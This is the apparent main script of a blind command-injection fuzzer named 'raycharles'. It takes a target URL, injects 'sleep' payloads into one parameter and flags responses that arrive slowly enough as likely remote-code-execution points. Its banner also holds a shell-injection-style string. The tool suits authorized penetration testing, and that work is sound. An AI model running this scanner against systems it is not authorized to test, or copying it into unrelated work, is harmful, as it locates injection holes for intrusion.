import httpx
import time

from raycharles.utils import detect_parameters
from raycharles.payloads import build_payloads

from argparse import ArgumentParser

from rich.progress import Progress
from rich.console import Console


def main() -> int:
    console = Console()

    console.print(
        r"""
[red]
         _ _      _|_  _  _| _  _
        | (_|\/  (_| |(_|| |(/__\
            /                   
[/]
[bright_black]
'' 2>/dev/null; echo "[green]Blind RCE fuzzer[/]" #
[/]
        """
    )

    parser = ArgumentParser()

    parser.add_argument(
        "-u", "--url", metavar="<url>", help="Target URL", required=True
    )

    parser.add_argument(
        "-T",
        "--sleep-time",
        metavar="<seconds>",
        help="Sleep time",
        required=False,
        default=5,
    )

    parser.add_argument(
        "-t",
        "--timeout",
        metavar="<seconds>",
        help="Host timeout",
        required=False,
        default=20,
    )

    parser.add_argument(
        "--user-agent",
        metavar="<string>",
        help="User agent",
        required=False,
        default="HitTheRoad/Jack",
    )

    parser.add_argument(
        "--ac-requests-number",
        metavar="<int>",
        help="Requests number for auto-calibration",
        required=False,
        type=int,
        default=15,
    )

    parser.add_argument(
        "--show-urls",
        help="Show all URLs",
        required=False,
        action="store_true",
        default=False,
    )

    arguments = parser.parse_args()

    url = arguments.url
    sleep_time = arguments.sleep_time
    timeout = arguments.timeout + sleep_time
    user_agent = arguments.user_agent
    ac_requests_number = arguments.ac_requests_number

    console.log(f"Target URL: '{url}'")

    splitted_url = detect_parameters(url)

    if len(splitted_url) == 1:
        console.log("No parameter found.")
        return 1

    if splitted_url.count("FUZZ") > 1:
        console.log("Too much parameters found.")
        return 1

    sleep_time = 5

    console.log(f"Using sleep time: {sleep_time}")

    payloads = build_payloads(f"sleep {sleep_time}")
    targets = []

    for payload in payloads:
        final_url = ""

        for part in splitted_url:
            if part == "FUZZ":
                final_url += payload
            else:
                final_url += part

        if arguments.show_urls:
            print(final_url)

        targets.append((final_url, payload))

    if arguments.show_urls:
        exit()

    session = httpx.Client(
        headers={"User-Agent": user_agent},
        timeout=timeout,
    )

    console.log(f"Sending {ac_requests_number} requests for auto-calibration...")

    times = []

    for _ in range(ac_requests_number):
        start_time = time.time()
        session.get(url)
        times.append(time.time() - start_time)

    average_ping = sum(times) / len(times)

    console.log(f"Found average ping: ~ {round(average_ping, 2)}")

    with Progress() as progress:
        task = progress.add_task("Trying payloads", total=len(targets))

        for url, payload in targets:
            start_time = time.time()
            session.get(url)
            total_time = time.time() - start_time

            if sleep_time - average_ping <= total_time:
                progress.log(
                    f"Found potential injection with payload: [red]{payload}[/] (~ {round(total_time - average_ping, 2)})"
                )

            progress.advance(task)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
